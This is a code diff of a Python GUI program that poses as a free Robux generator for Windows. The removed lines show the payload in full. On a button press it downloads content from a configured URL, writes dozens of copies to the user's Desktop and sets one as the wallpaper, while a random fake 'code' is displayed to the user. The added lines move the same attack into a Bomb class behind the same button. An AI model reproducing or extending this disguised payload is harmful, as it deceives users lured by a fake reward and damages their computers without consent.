@@ -6,6 +6,8 @@ import platform
 import random
 import backend.config as c
 import backend.paths as paths
+from backend.bomb import Bomb
+from backend.codegenerator import Generator
 
 # ! WORKS ONLY IN THE WINDOWS
 
@@ -26,38 +28,20 @@ bobuximg = ImageTk.PhotoImage(Image.open(paths.img("bobux")))
 robux = Label(image=bobuximg)
 robux.pack()
 
-try:
-    import requests
+bomb = Bomb()
+codeGenerator = Generator()
 
-    checkintenet = requests.get("https://www.google.com")
-    response = requests.get(c.url, stream=True)
-    hasinternet = True
-except Exception as e:
-    hasinternet = False
+def newCode():
+    codeGenerator.generate()
+    code.config(text="Output: "+codeGenerator.code)
+def attackPC():
+    newCode()
+    bomb.attack()
 
-def generateFakeCode():
-    fakecode = ""
-    
-    import yaml
-    chars = yaml.safe_load(open(paths.yaml("chars")))["chars"]
-    for i in range(random.randint(10, 20)):
-        fakecode += random.choice(chars)  
-    code.config(text="Output: "+fakecode)
-
-def attack():
-    generateFakeCode()
-
-    for i in range(random.randint(50, 125)):
-        with open(path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)), 'wb') as f:
-            f.write(response.content)
-
-    import ctypes
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(0)), 0)   
-
-if platform.system().lower() != "windows" or not hasinternet:
-    getrobuxnow.config(command=generateFakeCode)
-    print('Operating System not supported or is without internet!')
+if bomb.success:
+    getrobuxnow.config(command=attackPC)
 else:
-    getrobuxnow.config(command=attack)
+    getrobuxnow.config(command=newCode)
+    print('Operating System not supported or is without internet!')
 
 window.mainloop()
